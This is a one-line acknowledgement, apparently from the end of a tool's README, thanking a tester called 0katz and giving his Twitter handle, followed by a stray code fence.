[+] Thanks to my dude 0katz for helping with testing, follow him on twitter: @0katz
```


